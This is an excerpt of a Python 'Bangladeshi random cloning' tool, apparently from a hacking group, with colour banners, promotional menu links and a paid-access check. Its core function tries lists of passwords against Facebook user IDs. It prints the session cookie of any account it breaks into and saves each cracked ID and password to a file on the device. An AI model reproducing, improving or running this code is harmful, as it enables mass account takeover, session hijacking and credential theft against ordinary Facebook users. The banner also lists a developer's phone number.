...
╚═════╝ ╚══════╝  ╚═══╝  ╚═╝╚══════╝       
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
║  \x1b[97m\033[37;41m TEAM IS DEVIL SHEIKH CYBER ZONE \033[0;m  ║
\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                      
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
║  \x1b[97m\033[37;41m  FREE BANGLADESHI RANDOM CLONING V15 \033[0;m    ║
\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
   \033[35;1m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
   \033[35;1m║➣\033[1;91m DEVOLPER   :      SHIFAT+NIROB \33[1;92m║               
   \033[35;1m║➣ FACEBOOK   :             DEVIL CYBER ZONE \33[1;92m║                 
   \033[35;1m║➣\033[1;93m WHATSAPP   :      01758481525        \33[1;92m ║
   \033[35;1m║➣\033[1;34m GITHUB     :          NIROB-VAI             \33[1;92m  ║          
...
def Main():
	...
	print("[\033[1;37m04\33[1;92m][\033[1;93mD\33[1;92m] JOIN WHATSAPP  GROUP")
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/Cyber.Army00');time.sleep(1)
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://chat.whatsapp.com/BmjTNtIKY3YIpJ4ng7JY0D');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
...
def admin():
	...
	if bal =='2':
		...
		admin()
	if bal =='3':
		os.system('xdg-open https://t.me/c0yber');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mDEVIL CYBER\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [devil cyber-💚] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💙]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/devil.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    if id in DARK:
        ...
        print ("\n")
        os.system("espeak \"assalamualaikum ,I am D.E.V.I.L ROBOT and my boss is NIROB.Sir this tool is paid because 100% ok id just now login\"")
